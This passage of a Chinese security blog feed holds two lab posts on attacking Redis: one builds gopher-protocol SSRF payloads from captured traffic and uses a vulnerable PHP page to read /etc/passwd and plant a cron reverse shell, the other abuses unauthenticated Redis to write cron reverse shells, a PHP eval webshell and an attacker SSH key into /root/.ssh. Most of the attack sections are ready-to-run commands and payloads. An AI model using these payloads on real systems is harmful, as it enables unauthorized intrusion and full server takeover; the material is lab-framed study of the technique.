class="line">&gt; 2018/08/25 01:51:28.007530  length=56 from=0 to=55</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line">dir\r</div><div class="line"><span class="variable">$15</span>\r</div><div class="line">/var/spool/cron\r</div><div class="line">&lt; 2018/08/25 01:51:28.007715  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.012076  length=52 from=0 to=51</div><div class="line">*4\r</div><div class="line"><span class="variable">$6</span>\r</div><div class="line">config\r</div><div class="line"><span class="variable">$3</span>\r</div><div class="line"><span class="built_in">set</span>\r</div><div class="line"><span class="variable">$10</span>\r</div><div class="line">dbfilename\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">root\r</div><div class="line">&lt; 2018/08/25 01:51:28.012204  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.021196  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">save\r</div><div class="line">&lt; 2018/08/25 01:51:28.023025  length=5 from=0 to=4</div><div class="line">+OK\r</div><div class="line">&gt; 2018/08/25 01:51:28.026348  length=14 from=0 to=13</div><div class="line">*1\r</div><div class="line"><span class="variable">$4</span>\r</div><div class="line">quit\r</div><div class="line">&lt; 2018/08/25 01:51:28.026530  length=5 from=0 to=4</div><div class="line">+OK\r</div></pre></td></tr></table></figure><p><strong>现在需要的就是将抓取到的redis攻击流量转化为gopher协议支持的格式，这里有一个转化规则</strong></p><ul><li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li></ul><p><strong>这里直接使用三叶草joychou师傅写的转化脚本tran2gopher.py</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding: utf-8</span></div><div class="line"><span class="comment">#author: JoyChou</span></div><div class="line">import sys</div><div class="line"></div><div class="line">exp = <span class="string">''</span></div><div class="line"></div><div class="line">with open(sys.argv[1]) as f:</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</div><div class="line">        <span class="keyword">if</span> line[0] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</div><div class="line">            <span class="built_in">continue</span></div><div class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></div><div class="line">        <span class="keyword">elif</span> line[-3:-1] == r<span class="string">'\r'</span>:</div><div class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></div><div class="line">            <span class="keyword">if</span> len(line) == 3:</div><div class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                line = line.replace(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</div><div class="line">                <span class="comment"># 去掉最后的换行符</span></div><div class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">                exp = exp + line</div><div class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></div><div class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</div><div class="line">            exp = exp + <span class="string">'%0a'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">            exp = exp + line</div><div class="line"><span class="built_in">print</span> exp</div></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python tran2gopher.py redis.log</div></pre></td></tr></table></figure><p><strong>其中redis.log为刚刚抓取到的redis攻击流量</strong><br><img src="http://pic.c1imber.top/blog/180826/5Gf0bKbjkB.png?imageslim" alt="mark"><br><strong>经过转化后内容如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0aaaa%0d%0a<span class="variable">$58</span>%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$3</span>%0d%0adir%0d%0a<span class="variable">$15</span>%0d%0a/var/spool/cron%0d%0a*4%0d%0a<span class="variable">$6</span>%0d%0aconfig%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$10</span>%0d%0adbfilename%0d%0a<span class="variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0asave%0d%0a*1%0d%0a<span class="variable">$4</span>%0d%0aquit%0d%0a%0a</div></pre></td></tr></table></figure><p><strong>在本地使用curl的gopher协议测试一下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -v <span class="string">'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0aaaa%0d%0a$58%0d%0a%0a%0a* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.109/7777 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a'</span></div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/eBC0agfj8L.png?imageslim" alt="mark"><br><strong>之后可以看到利用gpoher协议成功向任务计划目录下写了一个反弹shell的任务计划</strong><br><img src="http://pic.c1imber.top/blog/180826/09DjgED6if.png?imageslim" alt="mark"><br><strong>成功反弹shell</strong><br><img src="http://pic.c1imber.top/blog/180826/KF24aD93Ef.png?imageslim" alt="mark"></p><h3 id="ssrf漏洞实例"><a href="#ssrf漏洞实例" class="headerlink" title="ssrf漏洞实例"></a>ssrf漏洞实例</h3><p><strong>存在ssrf漏洞的代码<code>ssrf.php</code>如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;title&gt;ssrf漏洞实例&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=<span class="string">""</span>&gt;</div><div class="line">input:&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>/&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"get"</span>&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))</div><div class="line">&#123;</div><div class="line">       $ch = curl_init(); </div><div class="line">       curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line">       <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP |CURLPROTO_HTTPS);</span></div><div class="line">       curl_exec($ch); </div><div class="line">       curl_close($ch); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>漏洞场景：web应用实现了从其他服务器获取资源的功能，由于对url过滤不严而产生ssrf漏洞</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=http%3A%2F%2Fwww.4o4notfound.org%2Findex.php%2Farchives%2F33%2F&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/J6CfGcEE46.png?imageslim" alt="mark"></p><p><strong>首先查看php-curl扩展所支持的curl协议</strong><br><img src="http://pic.c1imber.top/blog/180826/ei4i2KHI8j.png?imageslim" alt="mark"><br><strong>使用dict协议对本地服务进行探测,探测ssh服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A22%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/2Lkjme2gk4.png?imageslim" alt="mark"><br><strong>探测redis服务版本payload:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=dict%3A%2F%2F127.0.0.1%3A6379%2Finfo&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/iJkI2mFLH4.png?imageslim" alt="mark"><br><strong>使用file协议读取服务器文件payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=file%3A%2F%2F%2Fetc%2Fpasswd&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/ekjlF5eJ12.png?imageslim" alt="mark"><br><strong>使用gopher协议攻击本地redis反弹shell payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.103/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250aaaa%250d%250a%2458%250d%250a%250a%250a*+*+*+*+*+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.109%2F7777+0%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2Fvar%2Fspool%2Fcron%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a&amp;submit=get</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180826/im7DLj8FEH.png?imageslim" alt="mark"><br><strong>可以看到成功通过gopher协议攻击了本地的redis服务，向任务计划目录下写了一个反弹shell的cron文件</strong><br><img src="http://pic.c1imber.top/blog/180826/d26K0ef5fk.png?imageslim" alt="mark"><br><strong>在kali上成功反弹到了shell</strong><br><img src="http://pic.c1imber.top/blog/180826/J2mHj0hfj9.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;a href=&quot;#ssrf漏洞原理以及利用方法&quot; class=&quot;headerlink&quot; title=&quot;ssrf漏洞原理以及利用方法&quot;&gt;&lt;/a&gt;ssrf漏洞原理以及利用方法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://c1aysec.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="https://c1aysec.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现</title>
    <link href="https://c1aysec.github.io/2018/08/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E7%BB%8F%E5%8E%86--ubuntu%E4%B8%8B%E7%9A%84redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://c1aysec.github.io/2018/08/19/记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现/</id>
    <published>2018-08-18T16:16:18.000Z</published>
    <updated>2018-12-19T11:29:52.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><a href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现" class="headerlink" title="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"></a>记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more" target="_blank" rel="external">解决ubuntu任务计划写shell失败的问题</a>和<a href="http://lawlietweb.com/2018/08/18/2018-08-18/#more" target="_blank" rel="external">关于ubuntu和centos cron的一些区别</a>这两篇文章</strong><br><a id="more"></a></p><h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server</strong></p><p><strong>kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用</strong></p><p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div><div class="line">make install（加入到用户环境变量/usr/<span class="built_in">local</span>/bin）</div></pre></td></tr></table></figure><p><strong>ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方</strong></p><pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</code></pre><p><img src="http://pic.c1imber.top/blog/180816/HkF3EJj621.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180816/31fij0h7l1.png?imageslim" alt="mark"></p><h3 id="尝试利用linux任务计划文件去反弹shell"><a href="#尝试利用linux任务计划文件去反弹shell" class="headerlink" title="尝试利用linux任务计划文件去反弹shell"></a>尝试利用linux任务计划文件去反弹shell</h3><p><strong>首先在ubuntu上开启redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/li4i2IkkDB.png?imageslim" alt="mark"></p><p><strong>由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-cli -h 192.168.0.107 -p 6379</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/fffCjfk2Ie.png?imageslim" alt="mark"><br><strong>现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。</strong></p><p><strong>首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/crontab</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180816/9EDGkJ5K49.png?imageslim" alt="mark"></p><p><strong>里面的参数和一些符号含义如下</strong></p><pre><code>m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</code></pre><p><strong>ubuntu下可以利用的cron有以下几个地方</strong></p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1</code>,也就是使用交互式的bash去反弹shell到kali</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180818/bbl7Dm2Hea.png?imageslim" alt="mark"><br><strong>接下来在redis-cli命令行输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\n* * * * * root ln -s -f bash /bin/sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step1</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step2</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/gGeJheDh71.png?imageslim" alt="mark"></p><p><strong>这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，<code>\n</code>这个符号前后分别不能小于2个，否则文件内容里面的任务计划会出现乱码导致命令执行失败，这是其中一个坑,可以看到<code>/etc/cron.d</code>目录下分别成功创建了一个名为step1和step2的任务计划文件</strong></p><p><strong>文件内容分别为</strong><br><img src="http://pic.c1imber.top/blog/180819/aL0DJmLL5D.png?imageslim" alt="mark"></p><p><strong>但是shell还是反弹失败了，<code>/bin/sh</code>的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是<code>ERROR (Syntax error, this crontab file will be ignored)</code></strong></p><p><img src="http://pic.c1imber.top/blog/180819/848Lkaj8EF.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/4IdFkL5gci.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/E2h2Fm7ffc.png?imageslim" alt="mark"></p><p><strong>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向<code>/etc/cron.d</code>目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</strong></p><h3 id="对于这一次失败的总结和看法"><a href="#对于这一次失败的总结和看法" class="headerlink" title="对于这一次失败的总结和看法"></a>对于这一次失败的总结和看法</h3><p><strong>对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，虽然失败，但是这一切都是值得的</strong></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法</strong></p><h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为<code>/var/www/html</code>,在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,如果想让php解析，需要安装<code>libapache2-mod-php</code>这个扩展</strong></p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p><img src="http://pic.c1imber.top/blog/180819/fClIhiBE92.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/IBEEbfgDJj.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/180820/eke56eebcF.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问向远程服务器写入ssh公钥"><a href="#利用redis未授权访问向远程服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向远程服务器写入ssh公钥"></a>利用redis未授权访问向远程服务器写入ssh公钥</h3><p><strong>ubuntu想要ssh远程登陆，首先需要安装openssh-server</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-server</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/68m41gGBdj.png?imageslim" alt="mark"><br><strong>然后需要ubuntu开放22端口允许ssh远程登陆并且开启密钥登陆，这里要修改ubuntu的<code>openssh-server</code>的配置文件<code>/etc/ssh/sshd_config</code>里的几个地方</strong><br><img src="http://pic.c1imber.top/blog/180822/Di4g4GhlKE.png?imageslim" alt="mark"></p><p><strong>其中<code>RhostsRSAAuthentication yes</code>代表允许远程RSA认证登陆，也就是密钥登陆，<code>AuthorizedKeysFile %h/.ssh/authorized_keys</code>代表服务器公钥的存放位置，也是要利用redis未授权访问漏洞写入公钥文件的位置</strong></p><p><strong>修改完成后重启ssh服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service ssh restart</div></pre></td></tr></table></figure><p><strong>之后在ubuntu的root目录下新建一个名为<code>.ssh</code>的目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root</div><div class="line">mkdir .ssh</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/3fdg73Gl2F.png?imageslim" alt="mark"></p><p><strong>接下来使用kali在本地生成一对密钥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/id_rsa</code>文件中，首先</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.107 -x <span class="built_in">set</span> aaa</div></pre></td></tr></table></figure><p><strong>将刚刚生成的公钥设置给redis里的变量aaa</strong><br><img src="http://pic.c1imber.top/blog/180822/hC3l8d6iak.png?imageslim" alt="mark"><br><strong>接下来在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180822/g09I15ABF0.png?imageslim" alt="mark"></p><p><strong>执行完毕后会在ubuntu服务器的<code>/root/.ssh</code>目录下生成一个<code>authorized_keys</code>的公钥文件，利用这个公钥文件就可以远程连接这台ubuntu了</strong><br><img src="http://pic.c1imber.top/blog/180822/8gBjG01E3f.png?imageslim" alt="mark"></p><p><strong>ssh远程连接</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.107</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/180822/LHC200k4jh.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
